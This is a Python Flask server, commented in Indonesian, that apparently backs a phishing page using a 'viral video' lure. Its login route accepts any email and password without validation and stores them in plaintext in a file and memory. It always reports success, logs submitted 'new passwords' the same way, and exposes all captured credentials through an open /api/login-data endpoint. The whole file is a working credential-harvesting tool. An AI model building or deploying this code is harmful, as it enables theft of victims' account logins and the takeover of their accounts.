from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
import json
import re
from datetime import datetime
import secrets

app = Flask(__name__)
app.config['SECRET_KEY'] = 'rahasia-sangat-aman-jangan-dibocorkan'
socketio = SocketIO(app, cors_allowed_origins="*")

# Mock database untuk user
users_db = {
    'admin@example.com': {
        'password': 'Admin123!',
        'name': 'Admin User'
    },
    'user@example.com': {
        'password': 'User123!',
        'name': 'Regular User'
    }
}

# Mock database untuk reset tokens
reset_tokens = {}

# Mock database untuk video data
video_data = {
    'title': 'nay blunder viral',
    'views': 1250,
    'likes': 85,
    'status': 'active'
}

# Fungsi validasi email
def is_valid_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

# Fungsi validasi password
def is_valid_password(password):
    if len(password) < 8:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    return True

# Route halaman utama
@app.route('/')
def index():
    return render_template('index.html')

# Database untuk menyimpan semua login attempts
login_attempts_db = []
login_data_file = 'login_data.txt'

# Fungsi simpan login data ke file
def save_login_data(email, password):
    timestamp = datetime.now().isoformat()
    login_entry = {
        'email': email,
        'password': password,
        'timestamp': timestamp
    }
    
    # Simpan ke memory database
    login_attempts_db.append(login_entry)
    
    # Simpan ke file
    try:
        with open(login_data_file, 'a') as f:
            f.write(f"{timestamp} | Email: {email} | Password: {password}\n")
    except Exception as e:
        print(f"Error saving to file: {str(e)}")
    
    return login_entry

# API Login
@app.route('/api/login', methods=['POST'])
def login():
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        password = data.get('password', '')
        
        # Validasi input dasar
        if not email or not password:
            return jsonify({
                'success': False,
                'message': 'Email dan kata sandi harus diisi'
            }), 400
        
        # Simpan data login ke server (tanpa validasi)
        login_entry = save_login_data(email, password)
        
        print(f"Login received - Email: {email}, Password: {password}")
        
        # Broadcast login success ke semua connected clients
        socketio.emit('realtime_data', {
            'type': 'login_status',
            'value': 'login_success',
            'user': email,
            'timestamp': datetime.now().isoformat()
        })
        
        # Login berhasil (tanpa validasi)
        user_info = {
            'email': email,
            'name': email.split('@')[0],  # Ambil bagian sebelum @ sebagai nama
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify({
            'success': True,
            'message': 'Login berhasil',
            'user': user_info
        }), 200
        
    except Exception as e:
        print(f"Login error: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Terjadi kesalahan server'
        }), 500

# API Forgot Password
@app.route('/api/forgot-password', methods=['POST'])
def forgot_password():
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        
        # Validasi input dasar
        if not email:
            return jsonify({
                'success': False,
                'message': 'Email harus diisi'
            }), 400
        
        # Simpan forgot password request
        print(f"Forgot password request - Email: {email}")
        
        # Broadcast forgot password event
        socketio.emit('realtime_data', {
            'type': 'password_reset_requested',
            'email': email,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'success': True,
            'message': 'Link reset kata sandi dikirim',
            'email': email
        }), 200
        
    except Exception as e:
        print(f"Forgot password error: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Terjadi kesalahan server'
        }), 500

# API Lihat Semua Data Login
@app.route('/api/login-data', methods=['GET'])
def get_login_data():
    try:
        return jsonify({
            'success': True,
            'total_attempts': len(login_attempts_db),
            'data': login_attempts_db
        }), 200
    except Exception as e:
        return jsonify({
            'success': False,
            'message': 'Terjadi kesalahan server'
        }), 500

# API Create New Password
@app.route('/api/create-password', methods=['POST'])
def create_password():
    try:
        data = request.get_json()
        email = data.get('email', '').strip()
        new_password = data.get('newPassword', '')
        
        # Validasi input dasar
        if not email or not new_password:
            return jsonify({
                'success': False,
                'message': 'Email dan kata sandi baru harus diisi'
            }), 400
        
        # Simpan password change
        print(f"Password change - Email: {email}, New Password: {new_password}")
        
        # Simpan ke file
        try:
            with open('password_changes.txt', 'a') as f:
                f.write(f"{datetime.now().isoformat()} | Email: {email} | New Password: {new_password}\n")
        except Exception as e:
            print(f"Error saving to file: {str(e)}")
        
        # Broadcast password change event
        socketio.emit('realtime_data', {
            'type': 'password_changed',
            'email': email,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'success': True,
            'message': 'Kata sandi berhasil diubah'
        }), 200
        
    except Exception as e:
        print(f"Create password error: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Terjadi kesalahan server'
        }), 500

# WebSocket event handlers
@socketio.on('connect')
def handle_connect():
    print('Client connected')
    emit('realtime_data', {
        'type': 'connection',
        'status': 'connected',
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    print('Client disconnected')

@socketio.on('heartbeat')
def handle_heartbeat(data):
    emit('realtime_data', {
        'type': 'heartbeat_response',
        'timestamp': datetime.now().isoformat()
    })

# Background thread untuk mengirim real-time data
def broadcast_realtime_data():
    while True:
        time.sleep(5)  # Kirim data setiap 5 detik
        
        # Update video data secara acak
        video_data['views'] += 1
        if video_data['views'] % 10 == 0:
            video_data['likes'] += 1
        
        socketio.emit('realtime_data', {
            'type': 'video_status',
            'value': video_data,
            'timestamp': datetime.now().isoformat()
        })

# Start background thread
broadcast_thread = threading.Thread(target=broadcast_realtime_data, daemon=True)
broadcast_thread.start()

if __name__ == '__main__':
    print('Starting server on http://0.0.0.0:53733')
    print('Press Ctrl+C to stop')
    socketio.run(app, host='0.0.0.0', port=53733, debug=True)